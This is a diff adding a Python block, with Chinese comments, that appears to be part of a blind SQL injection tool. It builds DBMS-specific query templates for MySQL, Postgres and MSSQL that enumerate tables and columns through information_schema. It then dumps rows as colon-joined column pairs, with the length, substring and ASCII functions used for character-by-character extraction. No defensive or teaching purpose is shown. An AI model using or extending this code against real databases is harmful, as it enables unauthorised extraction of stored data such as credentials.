@@ -1,0 +1,92 @@
+# ===================== DB PROFILE（手动选择） =====================
+DBMS = "mysql"   # 改成: "mysql" / "postgres" / "mssql"
+
+# Postgres 常见 schema
+PG_SCHEMA = "public"
+
+def db_profile():
+    if DBMS == "mysql":
+        return {
+            "DB_NAME_EXPR": "database()",
+            "LEN_FN": "LENGTH",
+            "SUBSTR_FN": "SUBSTRING",
+            "ASCII_FN": "ASCII",
+            "TABLE_EXPR": lambda i: (
+                "SELECT table_name FROM information_schema.tables "
+                "WHERE table_schema=database() "
+                f"LIMIT {i},1"
+            ),
+            "COL_EXPR": lambda i, tbl: (
+                "SELECT column_name FROM information_schema.columns "
+                "WHERE table_schema=database() "
+                f"AND table_name='{tbl}' "
+                f"LIMIT {i},1"
+            ),
+            "ROW_EXPR": lambda k, tbl, c1, c2: (
+                f"SELECT CONCAT({c1},0x3a,{c2}) FROM {tbl} LIMIT {k},1"
+            ),
+        }
+
+    if DBMS == "postgres":
+        return {
+            "DB_NAME_EXPR": "current_database()",
+            "LEN_FN": "LENGTH",
+            "SUBSTR_FN": "SUBSTRING",
+            "ASCII_FN": "ASCII",
+            "TABLE_EXPR": lambda i: (
+                "SELECT table_name FROM information_schema.tables "
+                "WHERE table_catalog=current_database() "
+                f"AND table_schema='{PG_SCHEMA}' "
+                f"OFFSET {i} LIMIT 1"
+            ),
+            "COL_EXPR": lambda i, tbl: (
+                "SELECT column_name FROM information_schema.columns "
+                "WHERE table_catalog=current_database() "
+                f"AND table_schema='{PG_SCHEMA}' "
+                f"AND table_name='{tbl}' "
+                f"OFFSET {i} LIMIT 1"
+            ),
+            "ROW_EXPR": lambda k, tbl, c1, c2: (
+                f"SELECT {c1}||':'||{c2} FROM {tbl} OFFSET {k} LIMIT 1"
+            ),
+        }
+
+    if DBMS == "mssql":
+        return {
+            "DB_NAME_EXPR": "DB_NAME()",
+            "LEN_FN": "LEN",
+            "SUBSTR_FN": "SUBSTRING",
+            "ASCII_FN": "ASCII",
+            "TABLE_EXPR": lambda i: (
+                "SELECT table_name FROM information_schema.tables "
+                "WHERE table_catalog=DB_NAME() "
+                "ORDER BY table_name "
+                f"OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY"
+            ),
+            "COL_EXPR": lambda i, tbl: (
+                "SELECT column_name FROM information_schema.columns "
+                "WHERE table_catalog=DB_NAME() "
+                f"AND table_name='{tbl}' "
+                "ORDER BY column_name "
+                f"OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY"
+            ),
+            "ROW_EXPR": lambda k, tbl, c1, c2: (
+                "SELECT "
+                f"ISNULL(CAST({c1} AS NVARCHAR(4000)),'') + ':' + "
+                f"ISNULL(CAST({c2} AS NVARCHAR(4000)),'') "
+                f"FROM {tbl} ORDER BY 1 "
+                f"OFFSET {k} ROWS FETCH NEXT 1 ROWS ONLY"
+            ),
+        }
+
+    raise ValueError("DBMS must be mysql/postgres/mssql")
+
+P = db_profile()
+DB_NAME_EXPR = P["DB_NAME_EXPR"]
+LEN_FN = P["LEN_FN"]
+SUBSTR_FN = P["SUBSTR_FN"]
+ASCII_FN = P["ASCII_FN"]
+TABLE_EXPR = P["TABLE_EXPR"]
+COL_EXPR = P["COL_EXPR"]
+ROW_EXPR = P["ROW_EXPR"]
+# ================================================================
